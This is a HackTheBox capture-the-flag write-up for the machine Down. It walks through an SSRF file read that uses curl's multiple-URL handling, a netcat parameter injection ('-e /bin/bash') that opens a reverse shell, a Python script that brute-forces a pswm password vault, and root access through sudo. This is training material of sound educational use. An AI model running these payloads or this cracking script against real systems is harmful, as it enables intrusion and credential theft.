---
title: HTB: Down
url: https://0xdf.gitlab.io/2025/06/17/htb-down.html
date: 2025-06-17T09:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, vulnlab, htb-down, nmap, ubuntu, feroxbuster, ssrf, ffuf, burp, burp-repeater, curl, file-read, parameter-injection, pwsm, source-code, pswm-decryptor
---

![Down](/img/down-cover.png)

Down has a website designed to check if a website is up. This presents an obvious SSRF, but to bypass filters and exploit it I’ll have to abuse curl’s feature of taking multiple URLs and pass a second URL with the file schema to read from the host.I’ll get access to the page source, and see there’s an expert mode that will make a raw TCP connection with netcat. I’ll use parameter injection there to get a shell. From there, I’ll dig into a pswm instance to get the next user’s password, and they have a simple sudo rule to root.

## Box Info

| Name | [Down](https://hackthebox.com/machines/down)  [Down](https://hackthebox.com/machines/down) [Play on HackTheBox](https://hackthebox.com/machines/down) |
| --- | --- |
| Release Date | [14 Jun 2025](https://twitter.com/hackthebox_eu/status/1935366938143736130) |
| Retire Date | 14 Jun 2025 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creators | [jkr jkr](https://app.hackthebox.com/users/77141)  [xct xct](https://app.hackthebox.com/users/13569) |

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.129.234.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-03 04:25 UTC
Nmap scan report for 10.129.234.87
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
oxdf@hacky$ nmap -vv -p 22,80 -sCV 10.129.234.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-03 04:26 UTC
...[snip]...
Nmap scan report for 10.129.234.87
Host is up, received echo-reply ttl 63 (0.092s latency).
Scanned at 2025-05-03 04:26:02 UTC for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9eTcP2DDxJHJ2uCdOmMRIPaoOhvMFXL33f1pZTIe0VTdeHRNYlpm2a2PumsO5t88M7QF3L3d6n1eRHTTAskGw=
|   256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwLt0rmihlvq9pk6BmFhjTycNR54yApKIrnwI8xzYx/
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Is it down or just me?
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...[snip]...
Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

Based on the [OpenSSH and Apache](/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 22.04 jammy (or maybe 22.10 kinetic).

### Website - TCP 80

#### Site

The website is designed to check if another website is up:

![image-20250502163054293](/img/image-20250502163054293.png)

If I enter a site on the internet it just hangs for a minute and eventually reports:

![image-20250502163631287](/img/image-20250502163631287.png)

If I host a webserver on my machine and give it my IP, it makes a request to my site:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.234.87 - - [03/May/2025 04:40:08] "GET / HTTP/1.1" 200 -

```

And shows it’s up:

![image-20250502163800416](/img/image-20250502163800416.png)

Similarly, if I request `http://localhost`, it returns up:

![image-20250502163834335](/img/image-20250502163834335.png)

#### Tech Stack

The HTTP response headers don’t show anything beyond Apache:

```

HTTP/1.1 200 OK
Date: Fri, 02 May 2025 20:41:25 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 739
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

```

The 404 page is the [default Apache 404](/cheatsheets/404#apache--httpd):

![image-20250502164100772](/img/image-20250502164100772.png)

Looking at the logs in Burp Proxy of my interactions with the site, the POST requests submitting the form go to `index.php`, suggesting this is a PHP site. The main page loads as `/index.php` as well.

If I look at the headers when the site sends a request to my server, I’ll see it’s using `curl`:

```

oxdf@hacky$ nc -lnnp 80
GET / HTTP/1.1
Host: 10.10.14.79
User-Agent: curl/7.81.0
Accept: */*

```

That’s not surprising, as [curl is integrated into PHP](https://www.php.net/manual/en/book.curl.php).

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.129.234.87 -x php
                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.234.87
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       27l       70w      739c http://10.129.234.87/index.php
301      GET        9l       28w      319c http://10.129.234.87/javascript => http://10.129.234.87/javascript/
200      GET       93l      207w     1794c http://10.129.234.87/style.css
200      GET     1302l     7419w   578132c http://10.129.234.87/logo.png
200      GET       27l       70w      739c http://10.129.234.87/
301      GET        9l       28w      326c http://10.129.234.87/javascript/jquery => http://10.129.234.87/javascript/jquery/
200      GET    10879l    44396w   288550c http://10.129.234.87/javascript/jquery/jquery
[####################] - 2m     90015/90015   0s      found:7       errors:9      
[####################] - 2m     30000/30000   227/s   http://10.129.234.87/ 
[####################] - 2m     30000/30000   233/s   http://10.129.234.87/javascript/ 
[####################] - 2m     30000/30000   239/s   http://10.129.234.87/javascript/jquery/  

```

Nothing at all interesting. This looks very much like a one page site.

## Shell as www-data

### Port Scan [Fail]

My first thought is to look for other open HTTP servers on the host that may only be only on localhost or maybe blocked by a firewall. I’ll set up a `ffuf` scan to brute force all possible ports. This is a bit tricky for two reasons:
- I have to include the `Content-Type` header, or the site doesn’t process the POST data and it returns the page with no results.
- `ffuf` doesn’t have a `range` input the way that `wfuzz` did, so I have to make a wordlist of numbers to put in. I’ll use the `seq` command, and I like to use [process substitution](https://en.wikipedia.org/wiki/Process_substitution) to do it inline. `<( command )` tells `bash` to handle the output of `command` as if it were a file.

The other args I’ll use are:
- `-u http://10.129.234.87/index.php` - The URL to send to.
- `-d url=http://%3A%2F%2Flocalhost:FUZZ` - The POST data, URL-encoded.
- `-fr 'for everyone'` - Filter out responses with the string “for everyone” to get just the open ports.

When getting this command working, I like to start with a small range that contains a port I know should work, like `-w <(seq 75 85)`, and when I get the expected response, then expand it to the full range:

```

oxdf@hacky$ ffuf -u http://10.129.234.87/index.php -d 'url=http%3A%2F%2Flocalhost:FUZZ' -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded' -fr 'for everyone'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.129.234.87/index.php
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http%3A%2F%2Flocalhost:FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: for everyone
________________________________________________

80                      [Status: 200, Size: 1961, Words: 271, Lines: 54, Duration: 4523ms]
:: Progress: [65535/65535] :: Job [1/1] :: 126 req/sec :: Duration: [0:10:07] :: Errors: 0 ::

```

Nothing.

### File Read

#### Identify Filter

The next thing I’ll try is if I can use the `file://` protocol instead of `http://` to read files on the host. I’ll send a POST request to Burp Repeater and give it a try:

![image-20250502170642263](/img/image-20250502170642263.png)

It fails.

#### Understand Filter

I’ll poke at the filter a bit more to get a feel for how it works. It seems to just be checking the start of the string for “http://” and “https://”. When I add “http:/” to the front, it gets filtered:

![image-20250502171035039](/img/image-20250502171035039.png)

One more “/” and it gets past:

![image-20250502171111521](/img/image-20250502171111521.png)

#### curl

An interesting trick about `curl` is that if I give it multiple URLs, it will fetch both. For example:

```

oxdf@hacky$ curl -s http://localhost/test1 http://localhost/test2
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>

```

There’s two 404 pages there, and at my Python webserver, two failed requests:

```
127.0.0.1 - - [03/May/2025 05:53:23] code 404, message File not found
127.0.0.1 - - [03/May/2025 05:53:23] "GET /test1 HTTP/1.1" 404 -
127.0.0.1 - - [03/May/2025 05:53:23] code 404, message File not found
127.0.0.1 - - [03/May/2025 05:53:23] "GET /test2 HTTP/1.1" 404 -

```

#### File Read

With that in mind, I’ll try a space between a legit URL and a `file://` URL:

![image-20250502173332836](/img/image-20250502173332836.png)

It works! I can also just break the first URL to only get the file read:

![image-20250502173410449](/img/image-20250502173410449.png)

That’s kind of like doing this:

```

oxdf@hacky$ curl -s http:// file:///etc/hostname
hacky

```

### Filesystem Enumeration

The current process is a `curl` process with `-s` and both URLs:

![image-20250502173554422](/img/image-20250502173554422.png)

I’ll switch to command line. I can get the environment variables for the current process (and with some `bash` to clean it up):

```

oxdf@hacky$ curl 'http://10.129.234.87/index.php' -d 'url=http:// file:///proc/self/environ' -o- -s | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p' | tr '\000' '\n'
APACHE_RUN_DIR=/var/run/apache2
SYSTEMD_EXEC_PID=864
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=8:21130
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=0320944a871242e8aea7f3bd1efad651
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html

```

I’ll grab the page source with `-d 'url=http:// file:///proc/self/cwd/index.php'`. The results are HTML encoded, so I’ll copy them into Burp Decoder and decode:

![image-20250502174313421](/img/image-20250502174313421.png)

### Source Analysis

#### Identify Expert Mode

Right towards the top of the `body` there’s an `if` branch:

```

<body>

    <header>
        <img src="/logo.png" alt="Logo">
        <h2>Is it down or just me?</h2>
    </header>

    <div class="container">

<?php
if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
  echo '<h1>Is the port refused, or is it just you?</h1>
        <form id="urlForm" action="index.php?expertmode=tcp" method="POST">
            <input type="text" id="url" name="ip" placeholder="Please enter an IP." required><br>
            <input type="number" id="port" name="port" placeholder="Please enter a port number." required><br>
            <button type="submit">Is it refused?</button>
        </form>';
} else {
  echo '<h1>Is that website down, or is it just you?</h1>
        <form id="urlForm" action="index.php" method="POST">
            <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>
            <button type="submit">Is it down?</button>
        </form>';
}

```

It’s looking for an `expertmode` parameter with the value “tcp”! I’ll try adding `?expertmode=tcp` to the end of the URL and a different text does load:

![image-20250502174557277](/img/image-20250502174557277.png)

#### curl Code

The code that handles POST requests looks like:

```

if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
...[snip]...
} elseif (isset($_POST['url'])) {
...[snip]...
}

```

The code that handles `curl` looks about like I would expect:

```

} elseif (isset($_POST['url'])) {
  $url = trim($_POST['url']);
  if ( preg_match('|^https?://|',$url) ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/curl -s $url");
    exec($ec . " 2>&1",$output,$rc);
    echo '<div class="output" id="outputSection">';
    if ( $rc === 0 ) {
      echo "<font size=+1>It is up. It's just you! =␝</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    } else {
      echo "<font size=+1>It is down for everyone! =␔</font><br><br>";
    }
  } else {
    echo '<div class="output" id="outputSection">';
    echo '<font color=red size=+1>Only protocols http or https allowed.</font>';
  }
}

```

On the third line there’s a `preg_match` looking for `http://` or `https://` at the start of the `$url`. Then it actually uses `exec` to run the `curl` binary, though wrapped in `escapeshellcmd` to block command injection.

#### Socket Code

The expertmode code starts by validating that the given IP is an IP:

```

if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
  $ip = trim($_POST['ip']);
  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);

```

Then it does the same for the port:

```

  $port = trim($_POST['port']);
  $port_int = intval($port);
  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);

```

Only if both are valid does it continue. then it uses `nc` to connect to the IP / port:

```

  if ( $valid_ip && $valid_port ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
    exec($ec . " 2>&1",$output,$rc);

```

### Exploit

#### Vulnerability

The problem with the above code is that it converts the `$port` value to an int (`$port_int`) and validates that value, but then it uses the original input in the command!

`intval` will get the valid integer from the start of the string:

```

php > echo intval("1234 this is a test");
1234

```

So this code turns the string into an int, validates that it’s an int, and then uses the original string!

`escapeshellcmd` will prevent command injection, but it will not prevent parameter injection. So I can send `-e /bin/bash` and try to get a shell!

#### Shell

Client side validation rules prevent me from entering my payload directly into the form:

![image-20250502180111558](/img/image-20250502180111558.png)

I’ll send a legit request to Burp Repeater, and add my payload:

![image-20250502180428208](/img/image-20250502180428208.png)

This request just hangs, but after a few seconds, there’s a connection at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.234.87 45706

```

`nc -e /bin/bash` doesn’t print a prompt, but I’ll enter `id` and it returns the results:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.234.87 45706
‍id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@down:/var/www/html$ script /dev/null -c /bin/bash
Script started, output log file is '/dev/null'.
www-data@down:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
‍            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@down:/var/www/html$ 

```

The user flag is in www-data’s home directory in the `html` folder:

```

www-data@down:/var/www/html$ ls
index.php  logo.png  style.css  user_aeT1xa.txt
www-data@down:/var/www/html$ cat user_aeT1xa.txt 
d4bc94b386ef7c8113698a8c4951cacd

```

## Shell as root

### Enumeration

#### Web Configuration

The only webserver directory in `/var/www` is `html`:

```

www-data@down:/var/www$ ls       
html

```

It contains only the one PHP page, an image, and a stylesheet:

```

www-data@down:/var/www$ ls html/
index.php  logo.png  style.css

```

The only Apache configuration file shows this one site:

```

www-data@down:/etc/apache2/sites-enabled$ cat 000-default.conf | grep -v '#' | grep .
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

#### Users

There is one home directory in `/home`:

```

www-data@down:/home$ ls
aleks

```

Interestingly, www-data can access it:

```

www-data@down:/home/aleks$ find . -type f
./.bashrc
./.sudo_as_admin_successful
./.local/share/pswm/pswm
find: './.cache': Permission denied
find: './.ssh': Permission denied
./.profile
./.bash_logout

```

www-data can’t access `.cache` or `.ssh`, but there’s another interesting file, `pswm`.

#### pswm

[pswm](https://github.com/Julynx/pswm) is a:

> *A simple command line password manager written in Python.*

It’s installed in `/usr/bin` on Down:

```

www-data@down:/home/aleks$ which pswm
/usr/bin/pswm

```

Running it as www-data errors out:

```

www-data@down:/home/aleks$ pswm
Traceback (most recent call last):
  File "/usr/bin/pswm", line 393, in <module>
    PASS_VAULT_FILE = get_xdg_data_path("pswm")
  File "/usr/bin/pswm", line 89, in get_xdg_data_path
    return _get_xdg_path(env="XDG_DATA_HOME",
  File "/usr/bin/pswm", line 60, in _get_xdg_path
    os.makedirs(config, exist_ok=True)
  File "/usr/lib/python3.10/os.py", line 215, in makedirs
    makedirs(head, exist_ok=exist_ok)
  File "/usr/lib/python3.10/os.py", line 215, in makedirs
    makedirs(head, exist_ok=exist_ok)
  File "/usr/lib/python3.10/os.py", line 225, in makedirs
    mkdir(name, mode)
PermissionError: [Errno 13] Permission denied: '/var/www/.local'

```

It’s trying to read in `/var/www/.local` and failing. I could try to make that directory, but www-data doesn’t have permissions:

```

www-data@down:/home/aleks$ mkdir -p ~/.local/share/pswm 
mkdir: cannot create directory '/var/www/.local': Permission denied

```

The file itself looks like base64-encoded and likely encrypted data:

```

www-data@down:/home/aleks$ cat .local/share/pswm/pswm 
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==

```

There are “\*” separating four different encoded strings.

### Decrypt Password Vault

#### Manually

The `pswm` script is not that long, and lives in one file. On [line 322](https://github.com/Julynx/pswm/blob/main/pswm#L322-L345), there’s a function, `encrypted_file_to_lines`:

```

def encrypted_file_to_lines(file_name, master_password):
    """
    This function opens and decrypts the password vault.

    Args:
        file_name (str): The name of the file containing the password vault.
        master_password (str): The master password to use to decrypt the
        password vault.

    Returns:
        list: A list of lines containing the decrypted passwords.
    """
    if not os.path.isfile(file_name):
        return ""

    with open(file_name, 'r') as file:
        encrypted_text = file.read()

    decrypted_text = cryptocode.decrypt(encrypted_text, master_password)
    if decrypted_text is False:
        return False

    decrypted_lines = decrypted_text.splitlines()
    return decrypted_lines

```

It’s using the `cryptocode` package’s `decrypt` function with the text from the file and the password. Seems easy enough to replicate. I don’t need to know the algorithm, as long as I try the same call that the legit program makes.

This script reads in a `pwsm` file and a wordlist, and then tries each word. A bit of experimentation shows that `cryptocode.decrypt` returns `False` if the key is wrong.

```

# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "cryptocode",
# ]
# ///
import cryptocode
import sys

if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <pwsm file> <wordlist>")
    sys.exit()

with open(sys.argv[1], 'r') as f:
    pwsm = f.read()

with open(sys.argv[2], 'rb') as f:
    passwords = f.read().decode(errors='ignore').split('\n')

for password in passwords:
        pt = cryptocode.decrypt(pwsm, password.strip())
        if (pt):
            print(f"Found password: {password}")
            print(pt)
            break

```

I added the dependency metadata at the top with `uv add --script brute-pwsm.py cryptocode`, and now it runs with `uv`:

```

oxdf@hacky$ uv run brute-pwsm.py   
Installed 2 packages in 9ms
usage: brute-pwsm.py <pwsm file> <wordlist>

```

It takes a bout three seconds to find the password, “flower”:

```

oxdf@hacky$ time uv run brute-pwsm.py pswm /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
Found password: flower
pswm    aleks   flower
aleks@down      aleks   1uY3w22uc-Wr{xNHR~+E

real    0m3.321s
user    0m2.098s
sys     0m1.217s

```

There’s a password for the aleks account on Down.

#### pswm-decryptor

There is a tool on GitHub called [pswm-decryptor](https://github.com/seriotonctf/pswm-decryptor). I found it quite difficult to find, but once I have it, it’s made to do just what I did above, take a wordlist and an encrypted file and find the password.

I’ll save a copy of the script on my host. It requires two dependencies, which I’ll add as in-line meta using `uv` (see [my uv Cheatsheet](/cheatsheets/uv#) for details):

```

oxdf@hacky$ uv add --script pswm-decrypt.py cryptocode prettytable
Updated `pswm-decrypt.py`

```

Now I can run the script with `uv` without having to worry about virtual environments:

```

oxdf@hacky$ uv run pswm-decrypt.py 
Installed 4 packages in 39ms
usage: pswm-decrypt.py [-h] -f FILE -w WORDLIST
pswm-decrypt.py: error: the following arguments are required: -f/--file, -w/--wordlist

```

It takes just over a second with `rockyou.txt` to find the password, decrypt the file, and print the results:

```

oxdf@hacky$ time uv run pswm-decrypt.py -f pswm -w /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
[+] Master Password: flower
[+] Decrypted Data:
+------------+----------+----------------------+
| Alias      | Username | Password             |
+------------+----------+----------------------+
| pswm       | aleks    | flower               |
| aleks@down | aleks    | 1uY3w22uc-Wr{xNHR~+E |
+------------+----------+----------------------+

real    0m1.879s
user    0m1.796s
sys     0m0.075s

```

This output is prettier than mine.

### Shell

#### Shell as aleks

The password works with `su` to get a shell as aleks:

```

www-data@down:/var/www$ su - aleks
Password: 
aleks@down:~$

```

It also works for SSH:

```

oxdf@hacky$ sshpass -p '1uY3w22uc-Wr{xNHR~+E' ssh aleks@10.129.234.87
Warning: Permanently added '10.129.234.87' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 System information as of Fri May  2 10:49:31 PM UTC 2025

  System load:           0.0
  Usage of /:            57.6% of 9.75GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             156
  Users logged in:       0
  IPv4 address for eth0: 10.129.234.87
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c2e
aleks@down:~$ 

```
*Disclaimer - I like to use `sshpass` to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.*

#### Shell as root

aleks can run any command as any user with `sudo`:

```

aleks@down:~$ sudo -l
[sudo] password for aleks: 
Matching Defaults entries for aleks on down:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User aleks may run the following commands on down:
    (ALL : ALL) ALL

```

`sudo -i` will return a root shell:

```

aleks@down:~$ sudo -i 
root@down:~#

```

And I can get the root flag:

```

root@down:~# cat root.txt
87bb9869************************

```